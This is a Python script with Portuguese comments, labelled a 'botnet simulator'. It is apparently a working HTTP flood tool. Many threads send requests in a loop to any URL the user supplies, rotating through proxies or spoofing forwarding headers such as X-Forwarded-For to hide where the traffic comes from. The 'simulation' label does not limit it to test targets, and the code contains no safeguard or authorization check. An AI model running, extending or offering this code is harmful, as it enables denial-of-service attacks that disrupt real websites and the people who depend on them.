#!/usr/bin/env python3
import sys
import argparse
import threading
import time
import random
import urllib.request
import urllib.error

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

stats = {
    "requests": 0,
    "success": 0,
    "errors": 0
}
running = True

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def attack_task(url, proxies):
    global stats, running

    while running:
        proxy_support = None
        current_proxy = None

        if proxies:
            current_proxy = random.choice(proxies)
            # Formato simples: http://ip:port
            proxy_support = urllib.request.ProxyHandler({
                'http': current_proxy,
                'https': current_proxy
            })
            opener = urllib.request.build_opener(proxy_support)
        else:
            opener = urllib.request.build_opener()

        try:
            # Randomize Headers para simular clientes distintos
            fake_ip = get_random_ip()
            req = urllib.request.Request(url)
            req.add_header("User-Agent", f"DistributedBot/{random.randint(1,9)}.0")

            # Tentar spoofing de IP se não houver proxy real (simulação de log pollution)
            if not proxies:
                req.add_header("X-Forwarded-For", fake_ip)
                req.add_header("Client-IP", fake_ip)
                req.add_header("X-Real-IP", fake_ip)

            with opener.open(req, timeout=5) as response:
                stats["requests"] += 1
                if 200 <= response.status < 300:
                    stats["success"] += 1
                else:
                    stats["errors"] += 1

        except Exception:
            stats["errors"] += 1

def monitor_thread():
    global stats, running
    while running:
        print(f"\r{Colors.OKBLUE}[*] Distributed Sim ({stats['requests']} reqs) | Success: {stats['success']} | Errors: {stats['errors']}{Colors.ENDC}", end="")
        time.sleep(1)

def main():
    global running
    parser = argparse.ArgumentParser(description="Simulador de Padrões Distribuídos (Botnet Simulator)")
    parser.add_argument("url", help="URL alvo")
    parser.add_argument("--proxies", help="Arquivo com lista de proxies (ip:port), um por linha")
    parser.add_argument("--threads", type=int, default=10, help="Número de threads simultâneas")
    parser.add_argument("--duration", type=int, default=60, help="Duração (s)")

    args = parser.parse_args()

    proxies = []
    if args.proxies:
        try:
            with open(args.proxies, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"{Colors.OKGREEN}Carregados {len(proxies)} proxies.{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}Erro ao carregar proxies: {e}{Colors.ENDC}")
            sys.exit(1)
    else:
        print(f"{Colors.WARNING}Sem lista de proxies. Usando IP Spoofing (X-Forwarded-For) para simulação.{Colors.ENDC}")

    print(f"{Colors.HEADER}=== Iniciando Distributed Pattern Simulator ==={Colors.ENDC}")
    print(f"Alvo: {args.url}")

    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_task, args=(args.url, proxies))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido!{Colors.ENDC}")

    running = False
    print(f"\n{Colors.OKGREEN}Simulação finalizada.{Colors.ENDC}")

if __name__ == "__main__":
    main()
